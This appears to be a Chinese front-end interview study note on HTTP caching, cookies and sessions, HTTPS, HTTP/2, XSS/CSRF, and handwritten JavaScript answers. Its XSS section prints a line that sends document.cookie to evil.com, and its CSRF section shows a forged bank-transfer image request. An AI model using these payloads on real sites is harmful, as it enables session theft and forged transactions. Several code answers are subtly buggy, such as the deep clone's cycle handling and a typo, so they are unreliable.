## 一 面试题

### 1 状态码: 304

客户端有缓存情况下服务端的一种响应

协商缓存 => 　`if-modified-since (基于最后修改时间)`

- 发现自己缓存的文件有 Last Modified的标识 ，那么在本次请求中头会添加 If Modified Since

   若请求有If Modified Since，就说明已经有缓存在客户端，

  此时需要判断返回的是304还是200

  - 虽然在返回 304 的时候已经做了一次数据库查询，但是可以避免接下来更多的数据库查询，并且没有返回页面内容而只是一个 HTTP Header


> 1. 响应头部
>
>    Last-Modified: Fri, 17 Mar 2017 09:42:02 GMT
>
> 2. 浏览器请求头
>
>    客户端第二次请求此URL时 
>    
>    If-Modified-Since: Fri, 17 Mar 2017 09:42:02 GMT

### 2 宏任务&微任务&事件循环

- 宏任务  macrotask

  发起者： 宿主（Node、浏览器）

  1. script
  2. setTimeout/setInterval
  3.  UI rendering / UI事件
  4. postMessage / MessageChannel 新的语法！
  5.  setImmediate，I/O（Node.js）

- **microtask**

  发起者： JS引擎

  1. Promise的then / catch等回调

  2. MutaionObserver 

     监视对DOM树所做更改， DOM3 Events规范的一部分

  3.  `Proxy` 对象替代

  4. process.nextTick（Node.js）

### 3 关于浏览器缓存资源

文章： https://segmentfault.com/a/1190000018802578、

>  浏览器缓存只存在于每个单独的客户端，因此它是私有缓存，而非共享缓存（多用户）如何启用缓存?
>
>  1. Cache-Control
>  2. Expires
>  3. Last-Modified

#### 1 开启缓存

- 浏览器根据 response Headers 字段决定是否缓存资源

  1. Cache-Control

     ```js
     Cache-Control: private/public
     Cache-Control: max-age=300
     Cache-Control: no-cache
     ```

     - `private` ：表示该资源只能被浏览器缓存。
     - `public` ：该资源既能被浏览器缓存，也能被任何中间人（比如代理服务器、CDN 等）缓存。
     - `max-age` ：够被缓存的最大时间。`为0` 该资源仍然会被浏览器缓存，只不过立刻就过期了。
     - `no-cache` ：该资源会被缓存，但是立刻就过期了，因此需要先和服务器确认资源是否发生变化，只有当资源没有变化时，该缓存才会被使用，否则需要从服务器下载。相当于 `max-age=0`

  2. Expries

     也可以通过此参数来控制缓存

     `Expires` 标识了缓存的`具体过期时间`，来控制资源何时过期

     ```typescript
     Expires: Fri, 08 Mar 2029 08:05:59 GMT
     Expires: 0 // Expires: 0 仍然会启用缓存，只不过缓存立刻过期。
     ```
     
  3. 请查看304，这是浏览器默认的缓存

#### 2 优先级

- 哪一个会成功呢？

  1. Cache-Control: max-age=600
  2. Expires: 0

  Cache-Control 的优先级高于 Expires

#### 3 浏览器的默认行为

即便你不设置 cache-control 与 expries， 浏览器也会缓存一些内容。

进入缓判断的前提是是否有缓存。

具体查看状态码304的答案

- Response Header 中有 Last-Modified 但是没有 Cache-Control 和 Expires 时，

  浏览器会用一套自己的算法来决定这个资源会被缓存多长时间

#### 4 禁止缓存

给 `Cache-Control` 设置 `no-store` 会禁止浏览器和中间人缓存该资源。

在处理包含个人隐私数据或银行业务数据的资源时很有用。

#### 5 缓存位置/命中

以 `billbill`网站为例，便可看到其存在三种不同的size。 这便是缓存位置的不同。

![image-20210925144909241](../images/image-20210925144909241.png)

> 1. Service Worker: 浏览器缓存资源的一个网络代理，具体略。
> 2. Memory Cache: 内存缓存
> 3. Disk Cache : 硬盘缓存
> 4. Push Cache： 只在会话（Session）中存在， chrome仅存在5分钟
>
> 若以上依次都没有命中，则发起`网络请求`

#### 6 ⭐ 缓存分类

> 普通刷新会启用协商缓存，忽略强缓存.
>
> 只有在地址栏或收藏夹输入网址、通过链接引用资源等情况下，浏览器才会启用强缓存

1. 强缓存    （也称本地缓存）

   ⭐ 给资源设置个过期时间，客户端每次请求资源时都会看是否过期；只有在过期才会去询问服务器。

2. 协商缓存（也称弱缓存）

   ⭐ 协商缓存就是需要客户端和服务器两端进行交互的

> 浏览器缓存机制

1. 会先去缓存里面查看是否命中强缓存，如果命中，则直接从缓存中读取资源，不会发送请求到服务器

   或者 `如果强缓存时间过期， 也属于未命中！`

2. 当强缓存没有命中时，浏览器一定会向服务器发起请求。

   - 服务器会根据 Request Header 中的一些字段来判断是否命中协商缓存。

   - 如果命中协商缓存，服务器会返回响应，但是不会携带任何响应实体，只是告诉浏览器可以直接从缓存中获取这个资源。

   - 否则，进入下一步。

3. 如果前两步都没有命中，则直接从服务器加载资源

#### 7 关闭缓存

1. cache-control: no-cache

   跳过设置强缓存，但是不妨碍设置协商缓存；

   一般如果你做了强缓存，只有在强缓存失效了才走协商缓存的，设置了no-cache就不会走强缓存了，每次请求都回询问服务端。

   - no-cache，浏览器和缓存服务器都不应该缓存页面信息； 

2. cache-control: no-store

   不缓存，这个会让客户端、代理服务器都不缓存，也就没有所谓的强缓存、协商缓存了

   - no-store，请求和响应的信息都不应该被存储在磁盘系统中；

### 4 浏览器缓存数据 【会话跟踪技术】

> 1.  cookie
> 2. **session**
> 3. **localStorage**
>
> > Cookie通过在客户端记录信息确定用户身份，Session通过在服务器端记录信息确定用户身份。

- cookie、localStorage、sessionStorage既然是同源策略，为什么不安全呢？

  - 你可以设置httponly，即无法通过js读写.

  - 验证码 => 需要验证两个 cookie，一个验证的是用户名，一个验证的是随机数，由于是随机数

    故大大提高了难度

  - 利用加密方式防止明文值被破解

  - **强制要求开启HTTPS连接**

    服务器传送cookie时设置属性secure为true,表示创建的cookie只能在HTTPS连接中被浏览器传递到服务器端进行会话验证

  - 

  1. `xss攻击,` 盗取cookie的数据！获取私有用户的信息。 合肥项目的cookie开发环境的cookie的设置！

     ````js
     new Image().src=”http://www.evil.com?”+escape(document.cookie)
     ````

     即便secure开启且https => 你可以覆盖cookie的方法,对google进行了攻击

     ```js
     document.cookie=”user=admin;domain=’.test.com’;path=’/aaa’;secure;httponly”
     ```

  2. 

#### 1 cookie

- 为什么要有cookie

  1. 在下一个请求发送时，服务器无法确定这次请求和上次的请求是否来自同一个客

     户端。`如何让服务器知道不同的请求是否来自同一个客户端`

     HTTP是一种无状态的协议

  2. cookies就是http的一个扩展

     有两个http头部是专门负责设置以及发送cookie的,它们分别是`Set-Cookie`以及`Cookie`

     - Set-Cookie

       客户端建立一个cookie，并且在后续的http请求中自动发送这个cookie到服务器端，直到这个cookie过期。如果cookie的生存时间是整个会话期间的话，那么浏览器会将cookie保存在内存中，浏览器关闭时就会自动清除这个cookie

     - Cookie

       保存在客户端， 览器关闭的话，该cookie也不会被清除。下次打开浏览器访问对应网站时，这个cookie就会自动再次发送到服务器端

- cookie的特点

  1. 会话cookie: 不设置过期时间，cookie被保存在`内存`中，生命周期`随浏览器的关闭`而`结束`

     `设置`了cookie的过期时间, 

     cookie被保存在`硬盘`中，关闭浏览器后，cookie数据仍然存在，`直到过期时间结束`才消失

  2. `每次网络请求` Request headers 中都会带上cookie, 故cookie 太多太大会消耗带宽

     一般`浏览器存储cookie` 最大容量为4k，所以大量数据不要存到cookie

     cookie只能保存`字符串`类型，以文本的方式

  3. 保存在客户端上。

- 场景：用于记录不敏感信息
  1. 用户是否登陆过网站,
  2. 保存上次查看的页面、浏览计数这类信息
  
- cookie

  1. 客户端发送一个http请求到服务器端
  2. 服务器端发送一个http相应到客户端，响应头包含Set-Cookie头部
  3. 客户端发送一个http请求到服务器端，请求头包含Cookie头部
  4. 服务器端发送一个http响应到客户端

#### 2  session

> session 是如何诞生的?
>
> > Session是服务器端使用的一种记录客户端状态的机制，使用上比Cookie简单一些，相应的也增加了服务器的存储压力。
>
> - cookie的致命性缺点:
>   1. cookie 是存在客户户端，而且它本身存储的尺寸大小也有限,但这不致命
>   2. `致命的缺点`: 用户可以是可见的，并可以随意的修改，很不安全. cookie存储于客户端

- session的运行机制
  1. 用户第一次的登录 => 浏览器会将用户信息发送给服务器 
  2. 服务器创建SessionId， 响应内容（Cookie）中将该SessionId一并返回给浏览器， 
  3. 浏览将其以特定key值`存储于cookie `【如SessionId】
  4. 下一次服务器接收到请求信息cookie，便可获取Session，可根据SessionId获知用户的Session并返回给浏览器
  
- 应用场景
  1. 与cookie大同小异
  
- 特性：、

  1. 只要关闭浏览器，session保存的cookie如 sessionId会被清空， `但session绝不会被清空！`

     为什么会这样?

     - session依赖的cookie特殊，该Cookie为服务器自动生成的，它的maxAge属性一般为–1，

       表示仅当前浏览器内有效

     - 如果客户端浏览器将Cookie功能禁用， session也会失效

  2. 这类子窗口会共享父窗口的Cookie，因此会共享一个Session

#### 3 WebStorage

> 即便是 session也无非是借助了cookie, 将任务转移到了服务器端以保证安全性。
>
> 有没有更好的的方案？
>
> 但其实 cookie还是不可获取的，因为我们确实要与服务器端进行交互
>
> Web Storage仅仅是为了在本地“存储”数据而生。

- WebStorage目标
  1. 摆脱cookie
  2. 希望数据量更大
  3. 跨会话

- 共性:

  1. 不与服务器通信。
  2. 可以存储5MB
  3. 字符串类型， 故建议是json字符串

- `改革之处`
1. 不再需要向服务器发送cookie了！不仅更加安全而且更快速了！
  2. 解决了cookie存储空间不足的问题


#### 3.1 localStorage

1. `除非主动删除`。 否则即便是关闭了页面、关闭了浏览器也不销毁。

   同一个浏览器的不同标签页。所以可以共享

2. 场景: 

   常用于长期登录（判断用户是否已登录），适合长期保存在本地的数据 

#### 3.2 sessionStorage

1. 当前会话！

   sessionStorage是不可以非同源跨标签访问的！除非其是同源， 故很适合SPA页面开发.

   `在关闭窗口或`标签页`之后将会删除这些数据。

   而传统的 cookie是目标是当前浏览器进程！

2. 应用场景:

   敏感账号一次性登录；

### 5 https

> 什么叫https?
>
> http: HyperText Transfer Protocol 超文本传输协议
>
> `S` Secure Socket Layer => 即 SSL

- 为什么要有https？ 为什么需要 SSL加密?

  传统的http是如此的： 客户端与服务器之间`没有任何身份确认的过程`，且是明文

  故存在风险

  1. 窃听, 黑客可获知通信的内容
  2. 篡改: 黑客可修改通信的内容
  3. 劫持: 黑客可冒充客户端与服务端的某一身份

#### 1 解决窃听问题

`使用加密`    对称加密+非对称加密

1. 对称加密： 加密和解密同用一个密钥, 即**任何人只要持有密钥就能解密了**
   - 以对称加密方式加密时必须将密钥也发给对方

   但这样被窃听以后，显然可以获取到密钥，毫无意义。因为是明文!
   
   - 缺点： 数据安全！
   
2. 非对称加密：

   公开密钥加密使用一对非对称的密钥。一把叫做私有密钥，另一把叫做公开密钥

   发送密文的一方使用**对方的公开密钥**进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密。

   这样即使被劫持到了公钥也是无所谓的事情。

   - 缺点： 解密效率问题！

3.  对称加密+非对称加密

   使用 非对称加密 将 【对称加密的密钥】进行加密。

   对方使用 私钥进行 解密， 获得 【对称密钥】

   - **可以确保交换的密钥是安全的前提下，使用对称加密方式进行通信**
   - 且效率良好！

#### 2 篡改问题

解决： 使用数字签名 => 但与劫持问题有相同问题， 你如何解密我的数字签名? 

> **证书颁发机构 **  故需要第三方机构

#### 3 劫持问题

数字证书认证机构处于客户端与服务器双方都可信赖的第三方机构的立场上。

> 第三方机构

1. 服务器的运营人员向第三方机构CA提交公钥、组织信息、个人信息(域名)等信息并申请认证;
2. CA给与服务器方
   - 申请者公钥
   - 数字签名的密文
   - 证书信息
3. 客户端发送请求 => 服务器返回证书文件
4. 客户端读明文信息， 使用CA公钥解密，对比第三方的证书信息，确定合法性。

#### 4 与http区别、https更慢

- https 建立于 SSL加密通道【加密数据】， http是明文传输
- HTTPS需要用到SSL证书，而HTTP不用;

其次 https被认为性能慢于 http

1. 性能消耗要大于HTTP, 因为并非是纯文本传输数据，**加密通信会消耗更多的CPU及内存资源**	

### 6 http1.x与http2.0

文档: https://segmentfault.com/a/1190000015316332

文档-2： https://segmentfault.com/a/1190000012975173?utm_source=sf-similar-article

> 历史的进程已然走到了今天，不知道未来又如何？
>
> 1. 1987年发布http协议1.0版本
>
> 2. 1997年发布http1.1协议 => tcp的复用方案 => 即熟知的 connection: keep-alive特性
>
> 3. 伴随移动端的 的越来越普及，图片与视频的加载越来越多，故 google提出 spdy协议。
>
>    http2即基于spdy协议，目前仍在提案。同期，quic协议提出，基于udp模拟tcp的面向连接。

#### 1 http1.x

> ❗ http 1.x 有一个致命的问题

- **缺陷**：线程阻塞，在同一时间，同一域名的请求有一定数量限制，超过限制数目的请求会被`阻塞`
- 这更像是安全机制： `并发限制`
- 所以真的存在大量的图片， 建议使用两个域名来分别处理。

#### 2 http1.0

- 浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接

  服务器完成请求处理后立即断开TCP连接，服务器不跟踪每个客户也不记录过去的请求；

  而问题在于 tcp 需要三次 客户端与服务器端的握手才可以，其每次tcp连接的成本很高

- 解决： 添加 `Connction:  keep-alive`

#### 3 http1.1

是改进版本

1. **持久连接**

   - 即默认的Tcp连接便不关闭，且可复用。

     在1.1之后Connection的默认值就是Keep-Alive

2. 管道机制

   - 同一个tcp连接，客户端可以发送多个请求

     多个HTTP请求放到一个TCP连接中一一发送，而在发送过程中不需要等待服务器对前一个请求的响应

     显然这样管道传输也会带来对应的缺点！

     - 注意： 但是pipelining并不能彻底解决holb的问题，比如只有GET，HEAD才能使用，POST不能使用，

     <img src="C:/Users/HuangPeng/AppData/Roaming/Typora/typora-user-images/image-20210927002719225.png" alt="image-20210927002719225" style="zoom:50%;" />

3. 分块传输编码

   服务器一旦有数据就传输，以【流模式】代替【缓存模式】。 相当于分块

4. 更多的请求方式

   RESTful方式 => put、delete、options等

5. 缺点

   - 用TCP连接，但是同一个TCP连接里面，所有的数据通信是**按次序进行**的。

     `服务器只有处理完一个请求，才会接着处理下一个请求`

   - 解决方案

     减少请求数、或同时多开持久连接

#### 4 http2

1. 二进制

   http2的头信息现在是 二进制！ 即 帧

   HTTP消息分解为很多独立的帧之后，就可以通过优化这些帧的交错和传输顺序

2. **完全多路复用**

   客户端和浏览器都可以同时发送多个请求或回应， 而且不用按照顺序一一对应

   - 实现： 

     一个request对应一个id，这样一个连接上可以有多个request。

     每个连接的request可以随机的混杂在一起，接收方可以根据request的id将request再归属到各自不同的服务端请求里面

3. **报头压缩**

   - 对于相同的头部，不必再通过请求发送，只需发送一次。

     比如每次都发送cookie这件事情！

     客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，产生一个索引号，之后就不发送同样字段了，只需发送索引号

   - 头信息压缩机制， gzip或compress压缩后再发送

4.  **服务器推送**

   HTTP/2 允许服务器未经请求，主动向客户端发送资源

#### 4 关于https

https不关心你是htpp1还是http2

HTTP协议通常承载于TCP协议之上， 在HTTP和TCP之间添加一个安全协议层（SSL或TSL），这个时候，就成了我们常说的HTTPS.

### 7 XSS攻击、CSRF攻击

#### XSS攻击

> 跨站脚本攻击(Cross Site Scripting), 与CSS区分， 故称呼为XSS
>
> `原理`:   `“教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码。`
>
> - 让对方浏览器执行你插入的js

1. 反射型XSS

   不存储于服务器。

   - 特点： **立刻用于解析和显示该用户的结果页面**

   - 典型例子： 

     通过浏览器地址栏输入的HTTP GET请求参数和页面搜索框输入的POST查询内容。

     恶意用户通过构造含恶意脚本的URL, 发送到各种群、朋友圈、邮箱，诱导用户点击，

     获取点击用户的信息，达到攻击目的。

2. **存储型XSS**

   - 特点： 

     用户通过Web客户端提交给服务端的数据，由服务端保存，然后永久显示在其他用户的页面上

   - 典型例子

     评论中含有恶意脚本，存储在了服务器中，普通用户访问到就会受到攻击，理论上该Web应用的任何用户都是攻击对象

3. DOM型XSS

   DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。

   `你可以认为Dom型XSS依然是属于反射型的一种`

   - 特点： 

     客户端的脚本程序可以通过DOM动态地检查和修改页面内容，

     它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行

#### CSRF攻击

> CSRF（Cross-site request forgery） => 跨站请求伪造
>
> `攻击者盗用了你的身份，以你的名义发送恶意请求`，
>
> 这种恶意请求会导致
>
> ​		以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......
>
> ​		造成的问题包括：个人	隐私泄露以及财产安全。

`CSRF攻击的思想`

CSRF需要2个网站

1. 【User】 浏览并登录 网站A， 服务器认为其正确登录并返回其 网站A的Cookie。 一次双向交互
2. 【User】 在没有登出A网站的情况下【cookie未过期，其session依旧有效】，来访问 危险网站【B】
3. `【B】网站要求访问第三方网站【A】，并向A发送一个请求`
4.   浏览器带着`【A】的Cookie`的访问A的服务器
5. 服务器无法识别 发起者是用户还是网站B，此时根据用户的Cookie提供的权限进行正常响应

`举例`

```js
类似这种
<img src='http://www.mybank.com/Transfer.php?toBankId=11&money=1000'/>
```

- 解决办法

  ⭐ 服务端的CSRF方式方法很多样， 最终方案便是客户端页面`增加伪随机数`

  1. 同源检测

     直接禁止外域（或者不受信任的域名）对我们发起请求。

     - Origin Header
     - Referer Header

     我们可以通过这两个头来获取请求的来源

     同源检测的`致命性问题`：

     1. 当一个请求是页面请求（比如网站的主页），

        而来源是搜索引擎的链接（例如百度的搜索结果），也会被当成疑似CSRF攻击

     2. 并不能排除本域发起。如果攻击者有权限在本域发布评论（含链接、图片等，统称UGC），那么它可以直接在本域发起攻击，这种情况下同源策略无法达到防护的作用

  2. 业界对CSRF的防御，一致的做法是使用一个Token

     `原理： CSRF只是盗用cookie， 并不能获取cookie的数据并解析它`

     - 服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中

       用户每一次提交数据的时候将token也给与服务器！

  3. 验证码

     其本质也类似于token, 增加伪随机数， 服务器进行额外的判断即可。

### 8 输入URL后

> https://segmentfault.com/a/1190000006879700

#### DNS解析

URL对应的IP  【从右向左的过程】

浏览器缓存DNS记录一段时间**， 浏览器也会存在DNS的缓存

- 访问www.goole.com为例

  `.` -> `.com` -> `google.com.` -> `www.google.com.`

  根域名服务器 未寻找， 便去com域名寻找， 以此类推

- DNS解析优化

  1. 浏览器缓存
  2. 系统缓存
  3. 路由器缓存
  4. IPS服务器缓存
  5. 根域名服务器缓存，顶级域名服务器缓存，主域名服务器缓存

- DNS负载均衡

  对于用户来说，具体哪个ip没人在乎。

  DNS可以返回一个合适的机器的IP给用户， 这种过程就是DNS负载均衡，又叫做DNS重定向

#### TCP连接（三次握手）

为什么是TCP连接呢？因为HTTP协议是使用TCP作为其传输层协议的.

1. 第一次握手

   客户端           发送syn包（syn=j）   =>     服务器 

   客户端进入   SYN_SENT

2. 第二次握手

   服务器            收到syn包，必须确认客户的SYN    同时自己也发送一个SYN包（syn=k）SYN+ACK，

     服务器进入SYN_RECV状态；

3. 第三次握手

   客户端收到服务器的SYN+ACK包。 向服务器发送确认包ACK(ack=k+1）。

   此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。

#### 请求处理

1. 发起请求

    HTTP请求包含请求`起始行`、`请求头部`、`请求主体`三部分

   - 请求行： 

     1. 请求方法 
     2.  url地址 
     3. 协议名称与版本

   - 请求头： 

     1. 与缓存相关的规则信息
     2. HTTP的报文头， 服务端据此获取客户端的信息， 若干属性

   - 请求体

     请求附带的数据，数据格式多样。

2. 以 发请求 是否到服务器为区别， 缓存又分为强缓存与弱缓存。

3. 接收响应

   - HTTP报文封装成HTTP的Request对象. 主要包括状态码，响应头，响应报文三个部分。\
     1. 响应头主要由Cache-Control、 Connection、Date、Pragma等组成。
     2. 响应体为服务器返回给浏览器的信息，主要由HTML，css，js，图片文件组成。
     3. 状态码

#### 渲染页面

解析和渲染。在渲染页面之前，需要构建DOM树和CSSOM树。

- Reflow 回流

  元素的内容、结构、位置或尺寸发生了变化，需要重新计算样式和渲染树

- Repaint 重绘

  新的外观类样式修改，应用新样式绘制这个元素， 并不是结构性的修改。

#### 关闭TCP （四次挥手）

1. 第一次挥手

   浏览器 发送 FIN = 1 的请求，来请求断开连接

2. 第二次挥手

   服务器收到请求后，服务器发送ACK表示我收到了！

3. 第三次挥手

   浏览器收到后， 判断是否服务器可能还有数据要发送， 接着发送 FIN请求表示我也没有数据了！可以断。

4. 浏览器需要返回ACK表示同意， 此时断开。

## 二 CSS面试题



## 三 Vue源码



### computed与watch实现机理

> 略



### vue的nextTick

ick 即指的是微任务！与微任务进行了联动！

nextTick的主要目的就是为了`让你获取到更新后的dom元素`, 不过在此时也保证了dom肯定存在

> 一处误区
>
> 虽然UI渲染也是一个宏任务，但DOM的修改是一个同步的任务！故vue在实现的时候其实也考虑到了此点，
>
> vue的dom操作是微任务，之后再进行UI渲染，减少了ui的渲染性能。

实现

1. Promise.then

2. MutationsObserve 

   - 由于IOS存在bug， 已于2.5版本废弃。

   主动去监听与修改textNode节点的内容，以便于事件加入到微任务中

3. setImmdiate

   - vue2.5废弃MutationsObserve 的代替品

   Node.js提供的`setImmediate()`函数

   事件循环的当前迭代中执行传递给`process.nextTick()`函数， 故也是一个微的任务

4. MessageChannel 宏任务

   - setTimeout 是有最小延迟时间的， 5 层以上的定时器嵌套会导致至少 4ms 的延迟
   - `无延迟的定时器！`

5. setTimeout宏任务

## 三 笔试

### 0 题目汇总⭐

1. 节流与防抖 答案: 略
2. 深拷贝 考虑的情况很多， 答案是一个非常完美的示范
3. 数组去重
4. 数组乱序
5. 手写 call、apply与bind
6. 继承 （ES5、ES6）
7. sleep函数
8. 实现promise、

### 2 深拷贝

- 关于正则拷贝的疑问

  ````js
  var regexp = new RegExp('xyz', 'gim'); => var regexp = /xyz/gim;
  
  									  xyz			gim
  const result = new target.constructor(target.source, reFlags.exec(target));
  ````

  

答案

````js
//判断数据是不是引用类型
function isObject(target) {
  return (
    target !== null &&
    (typeof target === "object" || typeof target === "function" || typeof target === 'symbol')
  );
}
// symbol、reg、function
function cloneType(type, target) {
  if (type === 'symbol') {
    return Object(Symbol.prototype.valueOf.call(target))
  }
  if (type === 'reg') {
    // 匹配字母、数字、下划线
    const reFlags = /\w*$/;
    // source 属性返回一个值为当前正则表达式对象的模式文本的字符串，该字符串不会包含正则字面量两边的斜杠			以及任何的标志字符。
    // JavaScript 正则表达式 constructor 属性返回 function RegExp() { [native code] }
    const result = new target.constructor(target.source, reFlags.exec(target));
    result.lastIndex = target.lastIndex;
    return result;  
  }
  if (type === 'function') {
    return function () {
      targe.call(this, ...arguments);
    };
  }

}

function init(type) {
  let result = null;
  switch (type) {
    case "[object Array]":
      result = [];
      break;
    case "[object Object]":
      result = {};
      break;
    case "[object Map]":
      result = new Map();
      break;
    case "[object Set]":
      result = new Set();
      break;
  }
  return result;
}

function deepClone(target) {
  let map = {};
  const result = clone(target, map);
  map = null;
  return result;
  function clone(target, map) {
    const isObj = isObject(target);
    const type = Object.prototype.toString.call(target);
    if (isObj) {
      let result = null;
      // 初始化
      result = init(type);
      if (type === "[object Object]") {
        const keys = Object.keys(target);
        keys.map(key => {
          //解决循环引用
          if (map[key]) return map[target];
          else {
            result[key] = clone(target[key], map);
            map[key] = result;
          }
        });
      }
      else if (type === "[object Array]") {
        const len = target.length;
        let i = -1;
        while (i++ < len - 1) {
          result[i] = clone(target[i], map);
        }
      }
      else {
        switch (type) {
          case "[object Date]":
            result = new Date(target);
            break;
          case "[object RegExp]":
            result = cloneType('reg', target);
            break;
          case "[object Function]":
            result = cloneType('function', target);
            break;
          case "[object Set]":
            target.forEach((value) => {
              result.add(clone(value, map));
            });
          case "[object Map]":
            target.forEach((value, key) => {
              result.set(key, clone(value, map));
            });
            break;
          case "[object Symbol]":
            result = cloneType('symbol', target);
        }
      }
      return result;
    }
    // 非对象 基本类型
    if (!isObj) {
      return target;
    }
  }
}
````

### 3 数组去重

> 1. 利用语法自身或键不可重复的特性使用重复
> 2. 循环比较去除重复

1. Set助我！

   - Set本身不可重复

   ```js
   Array.from (new Set(arr))
   ```

2. Map助我

   - Map的键名不可重复

   ````js
   // 你当然可以通过myMap.has(key)来优化
   arr.map(item => {myMap.set(item, null)});
   myMap.forEach((item, key) => {
       myArr.push(key);
   })
   ````

3. 双重循环去除重复

   > 实现方法大同小异

   ```js
   for (let i = 0; i <= arr.length - 1; i++) {
     let j = arr.length;
     while (--j > i) {
       console.log(j);
       if (arr[i] === arr[j]) {
         arr.splice(j, 1)
       }
     }
   }
   ```

4. `indexOf` 去除重复

   `includes` 同理 略

   你也可以用filter过滤， 但没必要吧，以上四种已经很简便了

   ```js
   let array = []
   for (var i = 0; i < arr.length; i++) {
     if (array.indexOf(arr[i]) === -1) {
       array.push(arr[i])
     }
   }
   console.log(array);
   ```

### 4 数组乱序

> 数组进行乱序处理 不过这是虚伪的随机

````js
arr.sort(function () {
   return .5 * Math.random(); 
});
````

- 更好的实现

  ```js
  function shuffle(array) {
      var m = array.length,
          t, i;
      while (m) {
          i = Math.floor(Math.random() * m--);
          t = array[m];
          array[m] = array[i];
          array[i] = t;
      }
      return array;
  }
  ```

  

> 题目升级: **有一个长度为 100 的数组，如何从中随机挑选 50 个元素，组成一个新的数组？**

洗牌算法

````js
function getRandomArrElement(arr, count) {
    let shuffled = arr.slice(0), 
        i = arr.length, 
        min = i - count, 
        temp, 
        index;
    while (i > min) {
        index = Math.floor((i--) * Math.random());
        temp = shuffled[index];
        shuffled[index] = shuffled[i];
        shuffled[i] = temp;
    }
    return shuffled.slice(min);
}
````

### 5 call、apply与bind

此外： https://segmentfault.com/a/1190000020871501

1. call

   - 将函数设为对象的属性

   ````js
   Function.prototype.myCall = function(_this = window) {
     _this.fn = this;
     let args = [...arguments].slice(1);
     let result = _this.fn(...args);
     delete _this.fn;
     return result;
   }
   ````

   

2. apply

   ````js
   Function.prototype.myApply = function(context = window, args = []) {
     context = context || window; // 参数默认值并不会排除null，所以重新赋值
     context.fn = this; // this是调用call的函数
     const result = context.fn(...args);
     delete context.fn;
     return result;
   }
   ````

3. bind

   ```js
   Function.prototype.myBind = function(context, ...args) {
     const _this = this;
     return function Bind(...newArgs) {
       // 考虑是否此函数被继承
       if (this instanceof Bind) {
         return _this.myApply(this, [...args, ...newArgs])
       }
       return _this.myApply(context, [...args, ...newArgs])
     }
   }
   ```

### 6 继承 （ES5、ES6）

#### 1 寄生组合式继承

- `组合式继承`: 原型链+构造函数

  1. 独享【属性】或【方法】用`构造`

  2. 共享【属性】或【方法】用`原型`！

     ````js
     function Father(name) {}
     Father.prototpe.say = function() {}
     
     function Son() {
         Super.call(this); # 继承属性
     }
     #1 继承方法 当然此处也会继承属性，不过由于存在相同的实例属性故会被拦截
     Son.prototype = new Father();
     ````

- `寄生式继承的`

  1. 首先要明白 `原型式继承`

     - 相当于又一个person的拷贝， 若其有引用类型，则是共有属性！在你不覆盖的前提下！

       不通过prototype便可以实现了一个共有属性！

     - 你可以`增强`这份`拷贝`

     ````js
     var person2 = Object.create(person, {
        name: {
         	value: 'Greg',  
        },
     });
     ````

  2. 寄生继承

     寄生继承 面对的是 对象这种类型，故给他起名字为寄生。 原理其实与原型式继承几乎相同。

     我只要返回一个新的对象给你，那么其实就是可以称呼其为寄生继承

     ```js
     function inheritProtoType(son, father) {
         var prototype = object(father.prototype); // 创建父类原型的副本
         # 修改原型导致 构造函数属性丢失（因为你将prototype转为了对象!）
         prototype.constructor = son;		   	  // 将该副本的constructor属性指向子类
         son.prototype = prototype;			      // 将子类的原型属性指向副本
     }
     ```

- `寄生组合式继承`

  1. 组合式继承

     独享【属性】或【方法】用`构造`

     共享【属性】或【方法】用`原型`

  2. 寄生继承解决继承的时候问题

     > 由于既需要继承 父类的 公有属性与方法， 也需要继承私有属性与方法， 那便会导致多余的一次构造被调用。

     ```js
     function Sub(age) {				# 构造函数继承（实例化父属性）
         Super.call(this);            
     	this.age = age;
     }
     								# 原型继承
     Sub.prototype = new SuperType();
     ```

     > 故有什么好办法，让原型继承不执行构造函数呢？ => 寄生继承``

     本质就是将原型改为对象，再指下。很好理解！确实如此！

     ```js
     function inheritProtoType(son, father) {
         
         var prototype = object(father.prototype); // 创建父类原型的副本
         # 修改原型导致 构造函数属性丢失（因为你将prototype转为了对象!）
         prototype.constructor = son;		   	  // 将该副本的constructor属性指向子类
         son.prototype = prototype;			      // 将子类的原型属性指向副本
     }
     ```

#### 2 ES6继承

> 1. `extends`实现原型继承
>
>    ```js
>    class A extends B{}
>    
>    Student.__proto__= Person
>    Student.prototype.__proto__ = Person.prototype;
>    ```
>
> 2. `super`实现父类实例继承
>
>    ⭐ 子类必须在constructor方法中调用super方法
>
>    ​       是继承父类的this对象，然后对其进行加工，如果不调用super方法，子类就得不到this对象
>
>    ````js
>     1 class Colorpoint extends Point {
>     2     constructor(x,y,color){
>     3         super(x,y); //调用父类的constructor(x,y)
>     4         this.color = color
>     5     }
>     6	}
>    ````
>
>    

示范

````js
class super{
    constructor(name,color){
        this.name=name;
        this.color=["red","blue","green"];
    }
    sayName(){
        alert(this.name);
    }
}
````

### 7 sleep函数

> sleep函数作用是让线程休眠，等到指定时间在重新唤起。js单线程是`不能实现休眠的`

1. 无线循环， 直至时间结束，虽然毫无意义，但是实现sleep, 但极消耗CPU

   ```js
   function sleep(time) {
     let t = Date.now();
     while (Date.now() - t < time) {
     };
   }
   ```

2. 通过回调，但是其作为另外的任务，并不对杜塞这个进程的其他代码继续执行

   故使用 async await吧， 虽然本质也是Promise， 将后续杜塞的代码都应是在Promise的回调中吧!

   ```js
   function sleep(time) {
       return new Promise((resolve) => {
       	setTimeout(resolve, time)
       })
   }
   sleep(1000).then( () => {})
   ```

   

### 8 实现promise与其附属函数

#### Promise

https://segmentfault.com/a/1190000023690122?utm_source=sf-similar-article

````js

const PENDDING = 'pendding';
const FULFILLED = 'fulfilled';
const REJECTED = 'rejected';
// 定义MyPromise
function MyPromise(executor) {
  const self = this;
  self.status = PENDDING;
  self.data = undefined;
  self.callbacks = [];

  function resolve(value) {
    if (self.status !== PENDDING) return;
    self.status = FULFILLED;
    self.data = value;
    // 立即执行异步回调函数，即他肯定是在then加入事件后再去执行他们，也考虑了同步问题
    setTimeout(() => {
      self.callbacks.forEach(callbacksObj => {
        callbacksObj.onResolved(value);
      })
    })
  }

